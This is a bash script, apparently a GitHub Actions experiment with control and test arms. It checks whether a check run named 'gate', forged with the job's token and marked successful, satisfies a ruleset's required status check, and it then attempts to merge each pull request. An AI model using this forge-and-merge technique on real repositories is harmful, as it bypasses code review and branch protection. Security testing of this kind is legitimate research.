#!/usr/bin/env bash
set -uo pipefail
if [ -z "${GITHUB_TOKEN:-}" ]; then
  echo "F3|VOID|GITHUB_TOKEN-EMPTY-IN-ENV - every result below is meaningless"; echo "F3|DONE"; exit 0
fi
echo "F3|EVENT|${GITHUB_EVENT_NAME:-?}|REF|${GITHUB_REF:-?}|RUN|${GITHUB_RUN_ID:-?}"
API=https://api.github.com/repos/kovac-labs/zz-mq-tok-1027
api () { curl -s -o /tmp/o -w '%{http_code}' -X "$1" -H "Authorization: Bearer ${GITHUB_TOKEN}" \
         -H 'Accept: application/vnd.github+json' ${3:+-d "$3"} "$API$2"; }
j () { python3 -c "import json;d=json.load(open('/tmp/o'));print(d$1)" 2>/dev/null || echo PARSE-FAIL; }
body () { head -c "${1:-220}" /tmp/o | tr -d '\n'; }

cell () {   # $1 label, $2 PR number, $3 ruleset id, $4 base branch
  local L="$1" N="$2" RS="$3" B="$4" S SHA MS
  # (i) THE VARIABLE, READ BACK FROM INSIDE THIS JOB - this is what the 10-27 arm lacked
  S=$(api GET "/rulesets/${RS}")
  echo "F3|${L}|IN-RUN-RULESET|http=${S}|$(python3 -c "
import json
try:
  d=json.load(open('/tmp/o'))
  rsc=[r['parameters']['required_status_checks'] for r in d['rules'] if r['type']=='required_status_checks']
  print('name=%s enforcement=%s target=%s rules=%s required_status_checks=%s'%(d.get('name'),d.get('enforcement'),
        d.get('target'),[r['type'] for r in d['rules']],json.dumps(rsc)))
except Exception as e: print('UNREADABLE:'+str(e)[:70])
")"
  # (ii) and the base must have NO gate workflow, so a forged check is the only possible source
  S=$(api GET "/contents/.github/workflows/gate.yml?ref=${B}")
  echo "F3|${L}|IN-RUN-BASE-GATE-YML|http=${S}  (404 = absent, so only a forged check can exist)"
  S=$(api GET "/pulls/${N}"); SHA=$(j "['head']['sha']"); MS=$(j "['mergeable_state']")
  echo "F3|${L}|PR=${N}|head=${SHA:0:12}|PRE-mergeable_state=${MS}"
  S=$(api POST "/check-runs" "{\"name\":\"gate\",\"head_sha\":\"${SHA}\",\"status\":\"completed\",\"conclusion\":\"success\"}")
  echo "F3|${L}|FORGE-CHECKRUN|http=${S}|app=$(j "['app']['slug']")/$(j "['app']['id']")"
  sleep 8
  S=$(api GET "/pulls/${N}"); echo "F3|${L}|POST-FORGE-mergeable_state=$(j "['mergeable_state']")"
  S=$(api PUT "/pulls/${N}/merge" '{"merge_method":"merge"}')
  echo "F3|${L}|MERGE|http=${S}|$(body 260)"
}
cell CONTROL-pin-github-actions "$(cat .github/scripts/F3_PR_A)" "$(cat .github/scripts/F3_RS_A)" "$(cat .github/scripts/F3_BASE_A)"
cell ARM-pin-OTHER-app          "$(cat .github/scripts/F3_PR_B)" "$(cat .github/scripts/F3_RS_B)" "$(cat .github/scripts/F3_BASE_B)"
echo "F3|DONE"
